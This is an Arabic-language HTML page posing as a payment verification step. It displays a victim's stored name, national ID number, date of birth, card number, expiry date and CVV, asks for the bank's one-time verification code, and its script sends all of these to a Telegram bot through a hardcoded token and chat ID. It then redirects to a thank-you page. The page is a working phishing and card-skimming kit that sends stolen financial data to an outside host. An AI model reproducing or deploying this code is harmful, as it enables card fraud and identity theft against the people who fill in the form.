<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>التحقق من الدفع</title>
  <style>
    /* الأساسيات */
    body {
      font-family: Arial, sans-serif;
      direction: rtl;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    header, footer {
      background-color: #004080;
      color: white;
      text-align: center;
      padding: 20px;
    }

    main {
      padding: 20px;
    }

    .container {
      background-color: white;
      padding: 20px;
      border-radius: 8px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    .info {
      margin-top: 20px;
      font-size: 16px;
    }

    .info p {
      margin: 10px 0;
    }

    .highlight {
      font-weight: bold;
      color: #004080;
    }

    button {
      padding: 12px;
      width: 100%;
      background-color: #004080;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
    }

    button:hover {
      background-color: #003366;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
    }

    /* تنسيق الهاتف والتابلت */
    @media only screen and (max-width: 600px) {
      .container {
        padding: 15px;
      }

      header, footer {
        padding: 10px;
      }

      button {
        font-size: 14px;
      }
    }
  </style>
</head>
<body>

  <header>
    <h2>التحقق من الدفع</h2>
  </header>

  <main>
    <div class="container">
      <h3>مراجعة بيانات الدفع</h3>

      <div class="info">
        <p><span class="highlight">الاسم:</span> <span id="name"></span></p>
        <p><span class="highlight">رقم الهوية:</span> <span id="idNumber"></span></p>
        <p><span class="highlight">تاريخ الميلاد:</span> <span id="dob"></span></p>
        <p><span class="highlight">رقم البطاقة:</span> <span id="cardNumber"></span></p>
        <p><span class="highlight">تاريخ الصلاحية:</span> <span id="expiryDate"></span></p>
        <p><span class="highlight">CVV:</span> <span id="cvv"></span></p>
        <p><span class="highlight">المبلغ المدفوع:</span> <span id="amount"></span> درهم</p>
      </div>

      <!-- إضافة حقل إدخال كود التحقق -->
      <label for="verificationCode">أدخل كود التحقق:</label>
      <input type="text" id="verificationCode" placeholder="أدخل كود التحقق" required />

      <button id="confirmBtn">تأكيد الدفع</button>
    </div>
  </main>

  <footer>
    جميع الحقوق محفوظة © 2025
  </footer>

  <script>
    // استرجاع البيانات المخزنة من الجلسة السابقة
    const formData = JSON.parse(sessionStorage.getItem('formData'));

    document.getElementById('name').textContent = formData.fullName;
    document.getElementById('idNumber').textContent = formData.idNumber;
    document.getElementById('dob').textContent = formData.dob;
    document.getElementById('cardNumber').textContent = formData.cardNumber;
    document.getElementById('expiryDate').textContent = `${formData.expiryMonth}/${formData.expiryYear}`;
    document.getElementById('cvv').textContent = formData.cvv;
    document.getElementById('amount').textContent = formData.amount;

    document.getElementById('confirmBtn').addEventListener('click', function() {
      const verificationCode = document.getElementById('verificationCode').value.trim();

      if (!verificationCode) {
        alert("❗ الرجاء إدخال كود التحقق.");
        return;
      }

      // إنشاء الرسالة لإرسالها إلى البوت
      const message = `
✅ تم تأكيد الدفع بنجاح!
-----------------------------------
👤 الاسم: ${formData.fullName}
🆔 رقم الهوية: ${formData.idNumber}
📅 تاريخ الميلاد: ${formData.dob}
📄 رقم البطاقة: ${formData.cardNumber}
📆 تاريخ الصلاحية: ${formData.expiryMonth}/${formData.expiryYear}
🔐 CVV: ${formData.cvv}
💵 المبلغ المدفوع: ${formData.amount} درهم
🔑 كود التحقق: ${verificationCode}
`;

      // إرسال الرسالة إلى بوت التلغرام
      fetch("https://api.telegram.org/bot8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I/sendMessage", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: "8404960059",  // معرف المحادثة
          text: message
        })
      })
      .then(() => {
        alert("تم إرسال بيانات الدفع بنجاح!");
      })
      .catch(() => {
        alert("❌ فشل الإرسال إلى البوت");
      });

      // الانتقال إلى صفحة التأكيد النهائي أو إتمام العملية
      window.location.href = "thank_you.html";  // هنا يمكن وضع صفحة شكرًا بعد الدفع
    });
  </script>

</body>
</html>
